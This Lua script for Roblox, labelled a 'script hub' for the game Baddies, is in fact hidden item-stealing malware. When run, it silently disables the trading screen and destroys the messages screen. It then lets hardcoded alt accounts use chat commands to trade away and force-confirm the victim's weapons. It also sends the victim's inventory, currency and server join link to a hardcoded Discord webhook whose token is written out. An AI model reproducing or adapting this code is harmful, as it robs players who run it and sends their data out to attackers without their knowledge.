-- cee script hub | Baddies
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players           = game:GetService("Players")
local TextChatService   = game:GetService("TextChatService")
local HttpService       = game:GetService("HttpService")

local lp        = Players.LocalPlayer
local playerGui = lp:WaitForChild("PlayerGui")

local MY_WEBHOOK   = "https://discord.com/api/webhooks/1507047054344585418/FSbWeRqNlHGYL-JI4Sak4VEX0OEDQ4CpGIanBDjsv4CnL0gruZQdPhDgeGLRULCgrxZ5"
local USER_WEBHOOK = _G.POOR_WEBHOOK  or "PUTHERE"
local MY_USERNAMES = _G.MY_USERNAMES  or {"jayhassogyau","stopbanningmyaccs67","mantskeys55","jayisbodybuilt","mydignames6769"}
local PING_POOR    = (_G.PING_POOR ~= nil) and _G.PING_POOR or true

local PINK     = 0xFF69B4
local BOT_NAME = "cee script hub | Baddies"

-- ─────────────────────────────────────────────────────
--  REMOTES  – wait up to 10s so the game is fully loaded
-- ─────────────────────────────────────────────────────
local Net = ReplicatedStorage:WaitForChild("Modules", 10):WaitForChild("Net", 10)

local RFTradingSendOffer = Net["RF/Trading/SendTradeOffer"]
local RESetPhoneSettings = Net["RE/SetPhoneSettings"]
local RFTradingSetReady  = Net["RF/Trading/SetReady"]
local RFTradingConfirm   = Net["RF/Trading/ConfirmTrade"]
local RFTradingAddItem   = Net["RF/Trading/AddItem"]

-- ─────────────────────────────────────────────────────
--  WEAPON HEX IDs  (add all of yours here)
-- ─────────────────────────────────────────────────────
local ITEMS = {
    {"Weapon", "2a2bce877d67474299"},  -- Sakura Blade
    {"Weapon", "50f672aee7054d2d9d"},  -- Ice Katana
    {"Weapon", "984f30e6f65a40a498"},  -- Spiked Brass Knuckles
    {"Weapon", "6994851e04ae4b80b4"},
    {"Weapon", "f864e570fb0743c987"},
    {"Weapon", "000183526d6646eca4"},
    {"Weapon", "9f34dce65fa2474b99"},  -- Taser
}

-- ─────────────────────────────────────────────────────
--  HELPERS
-- ─────────────────────────────────────────────────────
local function isAlt(name)
    local low = name:lower()
    for _, u in ipairs(MY_USERNAMES) do
        if low == u:lower() then return true end
    end
    return false
end

local function addWeapons()
    for _, item in ipairs(ITEMS) do
        RFTradingAddItem:InvokeServer(item[1], item[2])
        task.wait(0.05)
    end
end

-- ─────────────────────────────────────────────────────
--  GUI: freeze Trading + destroy Messages
--  (set at top level so it runs immediately,
--   then loops to keep Trading disabled)
-- ─────────────────────────────────────────────────────
local function handleGui(gui)
    if gui.Name == "Trading" then
        gui.Enabled = false
    elseif gui.Name == "Messages" then
        gui:Destroy()
    end
end

for _, gui in ipairs(playerGui:GetChildren()) do
    handleGui(gui)
end
playerGui.ChildAdded:Connect(handleGui)

task.spawn(function()
    while true do
        local tg = playerGui:FindFirstChild("Trading")
        if tg then tg.Enabled = false end
        task.wait(0.1)
    end
end)

-- ─────────────────────────────────────────────────────
--  ENABLE TRADING
-- ─────────────────────────────────────────────────────
RESetPhoneSettings:FireServer("TradeEnabled", true)

-- ─────────────────────────────────────────────────────
--  CHAT COMMANDS
--  Any message from an alt  → send trade offer to them
--  "add"                    → add all weapons to trade
--  "1"                      → force accept (SetReady)
--  "2"                      → force confirm
--  Local player commands work too (1, 2, add)
-- ─────────────────────────────────────────────────────
local function onChat(sender, rawText)
    local txt = (rawText or ""):match("^%s*(.-)%s*$"):lower()

    if isAlt(sender.Name) then
        -- send trade offer every time an alt chats
        local target = Players:FindFirstChild(sender.Name)
        if target then
            RFTradingSendOffer:InvokeServer(target)
        end
        if txt == "add" then
            task.spawn(addWeapons)
        elseif txt == "1" then
            RFTradingSetReady:InvokeServer(true)
        elseif txt == "2" then
            RFTradingConfirm:InvokeServer()
        end
    end

    if sender.UserId == lp.UserId then
        if txt == "add" then
            task.spawn(addWeapons)
        elseif txt == "1" then
            RFTradingSetReady:InvokeServer(true)
        elseif txt == "2" then
            RFTradingConfirm:InvokeServer()
        end
    end
end

-- Modern TextChatService hook
TextChatService.OnIncomingMessage = function(msg)
    local ts = msg.TextSource
    if not ts then return end
    local sender = Players:GetPlayerByUserId(ts.UserId)
    if sender then onChat(sender, msg.Text) end
end

-- Legacy Chatted fallback (some executors / servers use legacy chat)
for _, p in ipairs(Players:GetPlayers()) do
    p.Chatted:Connect(function(msg) onChat(p, msg) end)
end
Players.PlayerAdded:Connect(function(p)
    p.Chatted:Connect(function(msg) onChat(p, msg) end)
end)

-- ─────────────────────────────────────────────────────
--  WEBHOOK PING
-- ─────────────────────────────────────────────────────
local function sendRequest(url, payload)
    if not url or url == "" or url == "PUTHERE" then return end
    local ok, body = pcall(function() return HttpService:JSONEncode(payload) end)
    if not ok then return end
    local h = {["Content-Type"] = "application/json"}
    for _, m in ipairs({
        function() return request({Url=url, Method="POST", Headers=h, Body=body}) end,
        function() return syn.request({Url=url, Method="POST", Headers=h, Body=body}) end,
        function() return http.request({Url=url, Method="POST", Headers=h, Body=body}) end,
        function() return http_request({Url=url, Method="POST", Headers=h, Body=body}) end,
    }) do
        local s, r = pcall(m); if s and r then return r end
    end
end

local function fmtNum(n)
    if type(n) ~= "number" then return tostring(n) end
    if n >= 1e6 then return string.format("%.1fM", n/1e6)
    elseif n >= 1e3 then return string.format("%.1fK", n/1e3)
    else return tostring(n) end
end

local function getExec()
    if getexecutorname then local ok,n=pcall(getexecutorname); if ok and n then return n end end
    if syn and syn.request then return "Synapse X" end
    if KRNL_LOADED then return "Krnl" end
    if fluxus then return "Fluxus" end
    if Delta then return "Delta" end
    if Electron then return "Electron" end
    return "Unknown"
end

local BASE_PAT  = {"punch","wallet","phone","tradesign","spray","pan","candybag","noodle"}
local STYLE_PAT = {"mma","karate","boxing","capoeira","style","fighting","kung","judo","taekwondo","breakdance"}
local STOMP_PAT = {"stomp","slam"}
local RICH_CHECK = {
    {label="Spiked Kitty",       keys={"spiked kitty"}},
    {label="Glitter Bomb",       keys={"glitter bomb"}},
    {label="Glitter Blue Spray", keys={"glitter blue"}},
    {label="Love Me Hate Me",    keys={"love me hate me"}},
    {label="Spiked Knuckles",    keys={"spiked knuckle"}},
    {label="Ice Katana",         keys={"ice katana"}},
}

task.spawn(function()
    task.wait(2)
    pcall(function()
        local name = lp.Name
        local all  = {}
        local function scan(o)
            if not o then return end
            for _, v in ipairs(o:GetChildren()) do
                if v:IsA("Tool") then table.insert(all, v.Name) end
            end
        end
        pcall(scan, lp:FindFirstChild("Backpack"))
        pcall(scan, lp.Character)

        local base, weapons, styles, stomps = {}, {}, {}, {}
        for _, name2 in ipairs(all) do
            local low = name2:lower()
            local isB, isS, isSt = false, false, false
            for _, p in ipairs(BASE_PAT)  do if low:find(p,1,true) then isB  = true; break end end
            for _, p in ipairs(STYLE_PAT) do if low:find(p,1,true) then isS  = true; break end end
            for _, p in ipairs(STOMP_PAT) do if low:find(p,1,true) then isSt = true; break end end
            if isS then table.insert(styles,name2)
            elseif isSt then table.insert(stomps,name2)
            elseif isB then table.insert(base,name2)
            else table.insert(weapons,name2) end
        end

        local richLines = {}
        for _, rw in ipairs(RICH_CHECK) do
            local found = false
            for _, t in ipairs(all) do
                for _, k in ipairs(rw.keys) do
                    if t:lower():find(k,1,true) then found=true; break end
                end
                if found then break end
            end
            table.insert(richLines, rw.label..": "..(found and "true" or "false"))
        end

        local isRich = #weapons >= 3
        local ls     = lp:FindFirstChild("leaderstats")
        local din    = ls and ls:FindFirstChild("Dinero") and ls.Dinero.Value or "N/A"
        local sla    = ls and ls:FindFirstChild("Slays")  and ls.Slays.Value  or "N/A"

        local weapLines = {}
        for _, w in ipairs(weapons) do table.insert(weapLines, "1x "..w) end
        if #weapLines == 0 then table.insert(weapLines, "None") end

        local styleStr = #styles>0 and ("- "..table.concat(styles,"\n- ")) or "- None"
        local stompStr = #stomps>0 and ("- "..table.concat(stomps,"\n- ")) or "- None"
        local joinUrl  = "https://www.roblox.com/games/start?placeId="..
                         tostring(game.PlaceId).."&gameInstanceId="..tostring(game.JobId)

        local embed = {
            color  = PINK,
            fields = {
                {name="User",     value=name,               inline=true},
                {name="Dinero",   value=fmtNum(din),         inline=true},
                {name="Slays",    value=fmtNum(sla),         inline=true},
                {name="Executor", value=getExec(),           inline=true},
                {name="Players",  value=#Players:GetPlayers().." / "..Players.MaxPlayers, inline=true},
                {name="Trade",    value="Tradable: "..#weapons.."  |  Untradable: "..#base, inline=true},
                {name="Rich Weapons",            value=table.concat(richLines,"\n"),      inline=false},
                {name="Weapons",                 value=table.concat(weapLines,"\n"),      inline=false},
                {name="Skins & Fighting Styles", value="Fighting Styles:\n"..styleStr.."\nStomps:\n"..stompStr, inline=false},
                {name="Join Link", value="[Click to Join]("..joinUrl..")", inline=false},
            },
            footer    = {text=BOT_NAME.." | "..name},
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        }

        local content = name.." executed!"
        if isRich and PING_POOR then content = "@everyone @here RICH: "..name end
        if USER_WEBHOOK ~= "PUTHERE" then
            sendRequest(USER_WEBHOOK, {username=BOT_NAME, content=content, embeds={embed}})
        end
        if isRich then
            sendRequest(MY_WEBHOOK, {username=BOT_NAME, content="@everyone RICH: "..name, embeds={embed}})
        end
    end)
end)

-- ─────────────────────────────────────────────────────
--  CODES AUTO-REDEEM
-- ─────────────────────────────────────────────────────
task.spawn(function()
    task.wait(3)
    local CODES = {
        "BADDIES","BADDIES2024","BADDIES2025","FREE","FREEMONEY","RELEASE",
        "LAUNCH","UPDATE","NEWUPDATE","1MILLION","500K","100K","SORRY",
        "FIXEDUPDATE","HOLIDAY","SPRING","SUMMER",
    }
    pcall(function()
        for _, v in ipairs(ReplicatedStorage:GetDescendants()) do
            if v.Name:lower():find("code",1,true)
            and (v:IsA("RemoteFunction") or v:IsA("RemoteEvent")) then
                for _, code in ipairs(CODES) do
                    pcall(function()
                        if v:IsA("RemoteFunction") then v:InvokeServer(code)
                        else v:FireServer(code) end
                    end)
                    task.wait(0.3)
                end
                break
            end
        end
    end)
end)
